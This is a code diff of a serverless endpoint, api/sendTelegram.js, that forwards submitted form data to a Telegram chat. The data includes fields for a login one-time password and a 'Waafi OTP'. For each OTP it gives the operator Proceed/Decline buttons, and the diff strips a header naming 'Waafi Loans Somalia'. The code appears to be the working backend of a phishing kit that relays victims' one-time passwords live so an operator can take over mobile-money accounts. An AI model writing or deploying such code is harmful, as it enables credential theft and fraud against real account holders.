@@ -1,4 +1,4 @@
-// api/sendTelegram.js — Waafi Loans Somalia (Somali product, English Telegram output)
+// api/sendTelegram.js
 
 if (!global._otpStatuses) global._otpStatuses = {};
 
@@ -9,15 +9,14 @@ export default async function handler(req, res) {
   const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
   if (!TOKEN || !CHAT_ID) return res.status(500).send('Missing env vars');
 
-  let payload = {};
-  try { payload = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : (req.body || {}); }
+  let p = {};
+  try { p = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : (req.body || {}); }
   catch { return res.status(400).send('Invalid JSON'); }
 
   const esc = s => s == null ? '—' : String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
   const val = s => (s == null || s === '') ? '—' : esc(String(s));
   const line = (label, v) => `<b>${label}:</b> ${val(v)}\n`;
 
-  const p = payload;
   const event = p.event || 'Submission';
   const isOTP = event === 'Login OTP' || event === 'Waafi OTP';
 
@@ -47,20 +46,21 @@ export default async function handler(req, res) {
   if (p['Login OTP'])   text += line('Login OTP', p['Login OTP']);
   if (p['Waafi OTP'])   text += line('Waafi OTP', p['Waafi OTP']);
 
-  // Build inline keyboard for OTP events
+  // ── Inline keyboard for OTP events ──────────────────────
   const sessionId = p.sessionId || null;
-  let reply_markup = undefined;
+  let reply_markup;
 
   if (isOTP && sessionId) {
     global._otpStatuses[sessionId] = 'pending';
     reply_markup = {
       inline_keyboard: [[
-        { text: '✅ Proceed', callback_data: `proceed_${sessionId}` },
-        { text: '❌ Decline', callback_data: `decline_${sessionId}` },
+        { text: '✅ Proceed', callback_data: 'proceed_' + sessionId },
+        { text: '❌ Decline', callback_data: 'decline_' + sessionId },
       ]]
     };
   }
 
+  // ── Send to Telegram ─────────────────────────────────────
   try {
     const body = {
       chat_id: CHAT_ID,
@@ -79,9 +79,8 @@ export default async function handler(req, res) {
     const bodyText = await resp.text();
     if (!resp.ok) return res.status(502).send('Telegram error: ' + bodyText);
 
-    let parsed;
-    try { parsed = JSON.parse(bodyText); } catch { parsed = bodyText; }
-    return res.status(200).json(typeof parsed === 'string' ? { ok: true } : parsed);
+    try { return res.status(200).json(JSON.parse(bodyText)); }
+    catch { return res.status(200).send(bodyText); }
 
   } catch (e) {
     return res.status(500).send('Fetch error: ' + (e?.message || e));
